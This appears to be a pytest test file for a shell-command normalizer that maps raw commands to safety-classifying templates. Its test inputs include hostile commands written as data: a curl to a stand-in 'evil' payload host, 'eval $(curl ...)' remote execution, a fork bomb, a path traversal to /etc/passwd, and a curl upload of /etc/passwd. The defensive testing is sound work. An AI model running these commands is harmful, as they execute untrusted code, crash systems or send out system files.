"""Unit tests for shell_runner.normalizer."""

import pytest

from shell_runner.normalizer import normalize

CWD = "/home/test/work"
ENV = {"HOME": "/home/test"}


@pytest.mark.parametrize(
    "raw,expected_template",
    [
        # Basic
        ("ls -la /tmp/foo", "ls <tmp_path>"),  # -la stripped (ls in SAFE_FLAG_STRIP_VERBS)
        ("cat ./README.md", "cat <file_arg>"),  # cat in READ_ONLY_FILE_VERBS → <file_arg>
        ("head -n 50 ./log", "head <n> <file_arg>"),  # -n stripped; head READ_ONLY → <file_arg>
        ("grep 'foo bar' /tmp/log", "grep <arg> <file_arg>"),  # grep READ_ONLY → <file_arg>
        ("echo $HOME", "echo <home_path>"),  # $HOME expands to known env value → path
        ("ls ~/Downloads", "ls <home_path>"),
        ("ls *.py", "ls <glob>"),
        ("echo hello > ./out.txt", "echo hello > <cwd_path>"),
        # URLs — flags stripped for curl (in SAFE_FLAG_STRIP_VERBS)
        ("curl -s https://api.github.com/repos/x/y", "curl <safe_url>"),
        ("curl -s https://evil.example/payload", "curl <unsafe_url>"),
        ("curl -s ftp://example.com/x", "curl <unsafe_url>"),
        # Pipes — safe pipe-filter segments collapsed to <safe_pipe>
        ("cat /tmp/x.json | jq '.foo'", "cat <file_arg> | <safe_pipe>"),  # cat READ_ONLY → <file_arg>
        ("ls -la | head -n 20", "ls | <safe_pipe>"),  # ls flags stripped + head collapsed
        ("find /tmp -name '*.log' | xargs rm", "find <file_arg> <arg> | xargs rm"),  # -name stripped; find READ_ONLY → <file_arg>
        # Compound chains
        (
            "mkdir -p ./build && cd ./build && cmake ..",
            "mkdir -p <cwd_path> && cd <cwd_path> && cmake <cwd_path>",
        ),
        ("test -f ./x || touch ./x", "test -f <cwd_path> || touch <cwd_path>"),
        # Subshells
        ("echo $(date +%s)", "echo <subshell:date +<arg>>"),
        ("eval $(curl -s https://x/y)", "eval <subshell_exec_unsafe>"),
        # Heredocs
        ("cat <<EOF\nhello\nEOF", "cat <heredoc>"),
        # Process substitution (cat in READ_ONLY_FILE_VERBS → <file_arg> inside subst)
        (
            "diff <(cat a.txt) <(cat b.txt)",
            "diff <process_subst:cat <file_arg>> <process_subst:cat <file_arg>>",
        ),
        # Forkbomb (literal — not normalized to anything fancy)
        (":(){ :|:& };:", ":(){ :|:& };:"),
        # Numeric size suffix
        (
            "dd if=/dev/zero of=./out bs=1M count=10",
            "dd if=<system_path> of=<cwd_path> bs=<n> count=<n>",
        ),
        # Backtick subshell
        ("echo `whoami`", "echo <subshell:whoami>"),
        # Background
        ("python ./server.py &", "python <cwd_path>"),  # & stripped, segment.is_background=True
        # Redirect with append
        ("echo log >> ./logfile", "echo log >> <cwd_path>"),
        # Variable assignment + command (key=value as leading token)
        ("FOO=bar python ./x.py", "FOO=<arg> python <cwd_path>"),
        # Real-world Azure DevOps — -s stripped (curl in SAFE_FLAG_STRIP_VERBS)
        (
            "curl -s 'https://dev.azure.com/conda-forge/feedstock-builds/_apis/build/builds/1421644/logs/45'",
            "curl <safe_url>",
        ),
        # Real-world gh + jq — gh not in SAFE_FLAG_STRIP_VERBS; jq pipe collapsed
        (
            "gh pr list --json number,title | jq '.[] | select(.number > 100)'",
            "gh pr list --json number,title | <safe_pipe>",
        ),
        # Path traversal must resolve (cat READ_ONLY → <file_arg>, but path still classified)
        ("cat ./foo/../../../etc/passwd", "cat <file_arg>"),
        # Unknown verb
        ("xxd ./binary", "xxd <cwd_path>"),
        # --- Safe-domain expansion: CI-log artifact hosts ---
        # Azure Blob Storage (GitHub Actions / conda-forge log artifacts)
        (
            "curl -sL https://productionresultssa6.blob.core.windows.net/abc/log.txt",
            "curl <safe_url>",
        ),
        # GitHub Actions pipeline host
        (
            "curl -sL https://actions.githubusercontent.com/abc/log.zip",
            "curl <safe_url>",
        ),
        # GitHub artifact CDN
        (
            "curl -sL https://objects.githubusercontent.com/abc/artifact.zip",
            "curl <safe_url>",
        ),
        # Azure DevOps package URLs
        (
            "curl -sL https://pkgs.dev.azure.com/conda-forge/packages/foo",
            "curl <safe_url>",
        ),
        # Unknown host must still be unsafe
        (
            "curl -sL https://evil.randomhost.xyz/payload",
            "curl <unsafe_url>",
        ),
        # --- B1: curl -o/-O collapse to <file_arg> ---
        ("curl -sL https://actions.githubusercontent.com/x -o /tmp/x", "curl <safe_url> <file_arg>"),
        ("curl -sL https://actions.githubusercontent.com/x -o ./x", "curl <safe_url> <file_arg>"),
        # curl -T (upload) must NOT collapse path to <file_arg> — preserved security signal
        ("curl -T /etc/passwd https://api.github.com/upload", "curl -T <etc_path> <safe_url>"),
        # --- B2: READ_ONLY_FILE_VERBS collapse positional path args to <file_arg> ---
        ("wc /tmp/x", "wc <file_arg>"),
        ("wc ./x", "wc <file_arg>"),
        # head standalone (not piped — no <safe_pipe> collapse); -c stripped, 100→<n>
        ("head -c 100 /tmp/x", "head <n> <file_arg>"),
        # wc with flag — flag stripped, path still becomes <file_arg>
        ("wc -l /tmp/zig-ci-log.txt", "wc <file_arg>"),
        # --- A: deferred value-flag placeholders — order-invariance ---
        # -o BEFORE url: deferred <file_arg> lands at end after <safe_url>
        ("curl -sS -o /tmp/x https://dev.azure.com/foo", "curl <safe_url> <file_arg>"),
        # -o AFTER url: same result (existing behaviour, regression guard)
        ("curl -sL https://dev.azure.com/foo -o /tmp/x", "curl <safe_url> <file_arg>"),
        # --- B: safe-domain additions ---
        ("curl -sL https://conda-forge.org/docs/maintainer/foo", "curl <safe_url>"),
        ("curl -sL https://docs.conda-forge.org/foo", "curl <safe_url>"),
        ("curl -sL https://pypi.org/project/numpy", "curl <safe_url>"),
        ("curl -sL https://pypi.python.org/simple/numpy", "curl <safe_url>"),
        ("curl -sL https://raw.githubusercontent.com/conda-forge/feedstock/main/recipe.yaml", "curl <safe_url>"),
        ("curl -sL https://docs.pixi.sh/latest/", "curl <safe_url>"),
    ],
)
def test_normalize_template(raw: str, expected_template: str) -> None:
    result = normalize(raw, CWD, env=ENV)
    assert (
        result.template == expected_template
    ), f"\nraw:      {raw!r}\nexpected: {expected_template!r}\nactual:   {result.template!r}"


def test_segments_for_pipe() -> None:
    r = normalize("cat /tmp/x | jq .foo", CWD, env=ENV)
    assert len(r.segments) == 2
    assert r.segments[0].verb == "cat"
    assert r.segments[0].operator_to_next == "|"
    assert r.segments[1].verb == "jq"
    assert r.segments[1].operator_to_next is None


def test_background_marker() -> None:
    r = normalize("python ./server.py &", CWD, env=ENV)
    assert len(r.segments) == 1
    assert r.segments[0].is_background is True


def test_path_traversal_warning() -> None:
    r = normalize("cat ./foo/../../../etc/passwd", CWD, env=ENV)
    assert "path_traversal_resolved" in r.parse_warnings


def test_unknown_var_warning() -> None:
    r = normalize("echo $FOOBAR_NOT_SET", CWD, env={"HOME": "/home/test"})
    assert "unknown_var" in r.parse_warnings
    assert r.template == "echo <var>"


def test_unbalanced_quotes_returns_parse_ok_false() -> None:
    r = normalize('echo "unterminated', CWD, env=ENV)
    assert r.parse_ok is False
    assert "unbalanced_quotes" in r.parse_warnings


def test_placeholders_dict_records_substitutions() -> None:
    r = normalize("cat ./a.txt ./b.txt", CWD, env=ENV)
    assert "<cwd_path>" in r.placeholders
    assert sorted(r.placeholders["<cwd_path>"]) == ["./a.txt", "./b.txt"]


def test_curl_upload_flag_preserved_not_file_arg() -> None:
    """curl -T must keep its value as a path placeholder, not <file_arg>."""
    r = normalize("curl -T /etc/passwd https://api.github.com/upload", CWD, env=ENV)
    assert "-T" in r.template
    assert "<file_arg>" not in r.template
    assert "<etc_path>" in r.template


def test_combined_wc_after_curl_chain() -> None:
    """Simpler combined: curl ... -o /tmp/x && wc /tmp/x without -l flag."""
    raw = (
        "curl -sL https://productionresultssa6.blob.core.windows.net/abc/log.txt"
        " -o /tmp/x && wc /tmp/x"
    )
    r = normalize(raw, CWD, env=ENV)
    assert r.template == "curl <safe_url> <file_arg> && wc <file_arg>", (
        f"Unexpected template: {r.template!r}"
    )


def test_wc_after_ls_chain() -> None:
    """Sanity: wc /tmp/x as second segment of a simple && chain."""
    r = normalize("ls && wc /tmp/x", CWD, env=ENV)
    segs = r.segments
    assert len(segs) == 2, f"Expected 2 segments, got {len(segs)}: {segs}"
    wc_seg = segs[1]
    assert wc_seg.verb == "wc", f"Expected verb='wc', got {wc_seg.verb!r}"
    assert wc_seg.template == "wc <file_arg>", (
        f"Expected 'wc <file_arg>', got {wc_seg.template!r}"
    )


def test_value_flag_order_invariance() -> None:
    """curl -o before URL and curl -o after URL must produce the same template."""
    flag_first = normalize("curl -sS -o /tmp/x https://dev.azure.com/foo", CWD, env=ENV)
    flag_last = normalize("curl -sL https://dev.azure.com/foo -o /tmp/x", CWD, env=ENV)
    assert flag_first.template == flag_last.template, (
        f"Order-variant templates:\n  flag_first: {flag_first.template!r}\n"
        f"  flag_last:  {flag_last.template!r}"
    )
    assert flag_first.template == "curl <safe_url> <file_arg>"


def test_value_flag_order_invariance_with_wc() -> None:
    """Combined curl+wc pipeline: both argv orderings produce the same template."""
    flag_first = normalize(
        "curl -sS -o /tmp/x https://dev.azure.com/foo && wc -l /tmp/x", CWD, env=ENV
    )
    flag_last = normalize(
        "curl -sL https://dev.azure.com/foo -o /tmp/x && wc -l /tmp/x", CWD, env=ENV
    )
    assert flag_first.template == flag_last.template, (
        f"Order-variant combined templates:\n  flag_first: {flag_first.template!r}\n"
        f"  flag_last:  {flag_last.template!r}"
    )
    assert flag_first.template == "curl <safe_url> <file_arg> && wc <file_arg>"


def test_multiple_value_flags_deferred_in_encounter_order() -> None:
    """Multiple value-flags: both <file_arg> tokens appear at end, in encounter order."""
    r = normalize("curl --output /tmp/x -o /tmp/y https://dev.azure.com/foo", CWD, env=ENV)
    # template should end with two <file_arg> tokens, url before them
    assert r.template == "curl <safe_url> <file_arg> <file_arg>", (
        f"Unexpected template: {r.template!r}"
    )


def test_b2_positional_path_unaffected_by_deferral() -> None:
    """wc /tmp/x — B2 positional path collapse still works; no deferral involved."""
    r = normalize("wc /tmp/x", CWD, env=ENV)
    assert r.template == "wc <file_arg>", f"Unexpected template: {r.template!r}"


def test_combined_ci_log_fetch_and_count() -> None:
    """Full combined: curl safe-domain blob URL -o /tmp/x && wc -l /tmp/x.

    Before PR: `curl <unsafe_url> <tmp_path> && wc <tmp_path>`
    After PR:  `curl <safe_url> <file_arg> && wc <file_arg>`
    """
    raw = (
        "curl -sL https://productionresultssa6.blob.core.windows.net/abc/log.txt"
        " -o /tmp/zig-ci-log.txt && wc -l /tmp/zig-ci-log.txt"
    )
    r = normalize(raw, CWD, env=ENV)
    assert r.template == "curl <safe_url> <file_arg> && wc <file_arg>", (
        f"Unexpected template: {r.template!r}"
    )
